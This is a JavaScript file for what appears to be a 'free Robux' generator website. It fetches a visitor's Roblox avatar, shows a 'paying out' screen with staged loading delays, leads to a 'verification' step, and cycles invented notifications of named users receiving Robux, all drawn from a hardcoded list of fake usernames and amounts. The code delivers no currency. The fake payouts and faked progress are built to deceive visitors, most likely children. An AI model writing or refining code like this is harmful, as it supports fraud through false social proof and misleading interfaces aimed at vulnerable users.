document.addEventListener('DOMContentLoaded', () => {
    // DOM elements
    const fetchButton = document.getElementById('fetch-button');
    const backButton = document.getElementById('back-button');
    const nextButton = document.getElementById('next-button');
    const inputSection = document.getElementById('input-section');
    const loadingSection = document.getElementById('loading-section');
    const avatarSection = document.getElementById('avatar-section');
    const avatarContainer = document.getElementById('avatar-container');
    const avatarUsername = document.getElementById('avatar-username');
    const verificationSection = document.getElementById('verification-section');
    const errorMessage = document.getElementById('error-message');
    const successContent = document.getElementById('success-content');
    let selectedRobux = null;

    // Handle Fetch Button Click
   fetchButton.addEventListener('click', () => {
    const username = document.getElementById('username').value.trim();

    if (!username) {
        showPopup('Please enter a username.'); // Use the custom popup
        return;
    }
       
    localStorage.setItem('username', username); // Save the entered username

    // Show loading section, hide input section
    inputSection.style.display = 'none';
    loadingSection.style.display = 'block';

    // Simulate API call
    setTimeout(() => {
        fetch('/api/avatar', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username }),
        })
            .then((response) => response.json())
            .then((data) => {
                loadingSection.style.display = 'none'; // Hide loading section

                if (data.error) {
                    // Handle user not found
                    document.getElementById('error-message').style.display = 'block'; // Show error message
                    avatarSection.style.display = 'block'; // Show avatar section
                    successContent.style.display = 'none'; // Hide success content

                    // Hide "Paying out to user" text and avatar
                    document.getElementById('payout-header').style.display = 'none';
                    avatarContainer.style.display = 'none';
                    avatarUsername.textContent = ''; // Clear any previous username

                    console.error('User not found:', data.error);
                } else {
                    // Handle user found
                    avatarSection.style.display = 'block'; // Show avatar section
                    successContent.style.display = 'block'; // Show success content
                    document.getElementById('error-message').style.display = 'none'; // Hide error message

                    // Display "Paying out to user" text and avatar
                    document.getElementById('payout-header').style.display = 'block';
                    avatarContainer.style.display = 'block';
                    avatarUsername.textContent = username; // Display username
                    avatarContainer.innerHTML = `
                        <img src="${data.avatar_url}" alt="Roblox Avatar" style="width:150px; height:150px; border-radius:50%;">
                    `;
                    
                    // Display Next button
                    document.getElementById('next-button').style.display = 'inline-block';
                }
            })
            .catch((error) => {
                console.error('Fetch error:', error);
                loadingSection.style.display = 'none';

                // Show unexpected error message
                document.getElementById('error-message').style.display = 'block';
                document.getElementById('payout-header').style.display = 'none';
                avatarContainer.style.display = 'none';
                avatarSection.style.display = 'block';
                successContent.style.display = 'none';
                avatarUsername.textContent = '';
                avatarContainer.innerHTML = '<p class="error">An unexpected error occurred. Please try again.</p>';
            });
    }, 3000); // Simulated delay
});

    // Handle Robux Selection
    document.querySelectorAll('.robux-button').forEach((button) => {
        button.addEventListener('click', function () {
            // Remove active class from all buttons
            document
                .querySelectorAll('.robux-button')
                .forEach((btn) => btn.classList.remove('active'));

            // Add active class to clicked button
            this.classList.add('active');
            selectedRobux = this.getAttribute('data-amount');
            localStorage.setItem('selectedRobux', selectedRobux); // Save selected Robux
        });
    });

// Handle Next Button
nextButton.addEventListener('click', function () {
    if (selectedRobux) {
        // Show the Robux loading section
        avatarSection.style.display = 'none';
        document.getElementById('robux-loading-section').style.display = 'block';

        // Simulate loading for 3 seconds
        setTimeout(() => {
            // Hide the Robux loading section
            document.getElementById('robux-loading-section').style.display = 'none';

            // Show verification section
            verificationSection.style.display = 'block';

            // Populate verification details
            document.getElementById('verification-username').textContent =
                localStorage.getItem('username');
            document.getElementById('robux-amount').textContent = localStorage.getItem('selectedRobux');
            document
                .getElementById('verification-avatar')
                .setAttribute('src', avatarContainer.querySelector('img').getAttribute('src'));
        }, 3000); // 3-second loading simulation
    } else {
        showPopup('Please select a Robux amount!'); // Use the custom popup
    }
});

    // Handle Back Button
    backButton.addEventListener('click', () => {
        // Reset to input section
        avatarSection.style.display = 'none';
        inputSection.style.display = 'block';
        errorMessage.style.display = 'none'; // Hide error message
        successContent.style.display = 'none'; // Hide success content
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const burgerMenu = document.getElementById('burger-menu');
    const navMenu = document.getElementById('nav-menu');

    burgerMenu.addEventListener('click', () => {
        burgerMenu.classList.toggle('active');
        navMenu.classList.toggle('active');
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const track = document.querySelector('.carousel-track');
    const cards = Array.from(track.children);
    const nextButton = document.querySelector('.next');
    const prevButton = document.querySelector('.prev');
    const cardWidth = track.getBoundingClientRect().width;

    let currentIndex = 1;

    // Clone first and last cards for infinite looping
    const firstClone = cards[0].cloneNode(true);
    const lastClone = cards[cards.length - 1].cloneNode(true);

    track.appendChild(firstClone);
    track.insertBefore(lastClone, cards[0]);

    // Set initial position
    track.style.transform = `translateX(-${cardWidth}px)`;

    const updateCarousel = () => {
        track.style.transition = 'transform 0.5s ease-in-out';
        track.style.transform = `translateX(-${currentIndex * cardWidth}px)`;
    };

    nextButton.addEventListener('click', () => {
        currentIndex++;
        updateCarousel();
    });

    prevButton.addEventListener('click', () => {
        currentIndex--;
        updateCarousel();
    });

    track.addEventListener('transitionend', () => {
        if (currentIndex === 0) {
            track.style.transition = 'none';
            currentIndex = cards.length;
            track.style.transform = `translateX(-${currentIndex * cardWidth}px)`;
        }
        if (currentIndex === cards.length + 1) {
            track.style.transition = 'none';
            currentIndex = 1;
            track.style.transform = `translateX(-${cardWidth}px)`;
        }
    });

    window.addEventListener('resize', () => {
        const newCardWidth = track.getBoundingClientRect().width;
        track.style.transition = 'none';
        track.style.transform = `translateX(-${currentIndex * newCardWidth}px)`;
    });
});

document.querySelectorAll(".back-button").forEach((button) => {
    button.addEventListener("click", function () {
        window.location.href = "https://roblox-avatar-app.vercel.app/"; // Replace with your actual input page URL
    });
});

// Function to show the custom popup
function showPopup(message) {
    const popup = document.getElementById('custom-popup');
    const popupMessage = document.getElementById('popup-message');
    popupMessage.textContent = message; // Update the message text
    popup.style.display = 'flex'; // Display the popup
}

// Event listener for closing the popup
document.getElementById('popup-close').addEventListener('click', () => {
    document.getElementById('custom-popup').style.display = 'none';
});

// Trigger the popup when the Next button is clicked
document.getElementById('fetch-button').addEventListener('click', () => {
    const usernameInput = document.getElementById('username');
    const username = usernameInput.value.trim();

    if (!username) {
        showPopup('Please enter a username.'); // Show the custom popup
    } else {
        console.log('Username entered:', username); // Continue with your logic
    }
});

document.addEventListener('DOMContentLoaded', () => {
    const popupContainer = document.getElementById('notification-popup');

    // List of usernames with their specific avatar URLs
    const users = [
        { username: "PlayerOne", avatar: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-20A47D24C42C97F4856A28F4BE68097B-Png/150/150/AvatarHeadshot/Webp/noFilter" },
        { username: "GamerX", avatar: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-20A47D24C42C97F4856A28F4BE68097B-Png/150/150/AvatarHeadshot/Webp/noFilter" },
        { username: "RobloxMaster", avatar: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-20A47D24C42C97F4856A28F4BE68097B-Png/150/150/AvatarHeadshot/Webp/noFilter" },
        { username: "NoobSlayer", avatar: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-20A47D24C42C97F4856A28F4BE68097B-Png/150/150/AvatarHeadshot/Webp/noFilter" },
        { username: "PixelKing", avatar: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-20A47D24C42C97F4856A28F4BE68097B-Png/150/150/AvatarHeadshot/Webp/noFilter" },
    ];

    // Fixed Robux amounts
    const robuxAmounts = [800, 1700, 5500, 10000];

    function getRandomPayout() {
        const user = users[Math.floor(Math.random() * users.length)];
        const robux = robuxAmounts[Math.floor(Math.random() * robuxAmounts.length)];
        return { username: user.username, avatar: user.avatar, robux };
    }

    function showNotification() {
        const { username, avatar, robux } = getRandomPayout();
        popupContainer.innerHTML = `
            <img src="${avatar}" alt="${username} Avatar">
            <div class="popup-details">
                <h4>${username}</h4>
                <p>Received ${robux} Robux</p>
            </div>
        `;
        popupContainer.style.display = 'flex';
        popupContainer.classList.remove('fade-out'); // Ensure fade-out is reset

        // Hide notification with fade-out after 5 seconds
        setTimeout(() => {
            popupContainer.classList.add('fade-out'); // Trigger fade-out transition
            setTimeout(() => {
                popupContainer.style.display = 'none'; // Fully hide after transition
            }, 1000); // Match the duration of the CSS transition
        }, 5000);
    }

    function scheduleNotifications() {
        showNotification();
        const delay = Math.floor(Math.random() * (15000 - 6000 + 1)) + 6000; // Random delay between 6 and 15 seconds
        setTimeout(scheduleNotifications, delay);
    }

    scheduleNotifications(); // Start the notification cycle
});
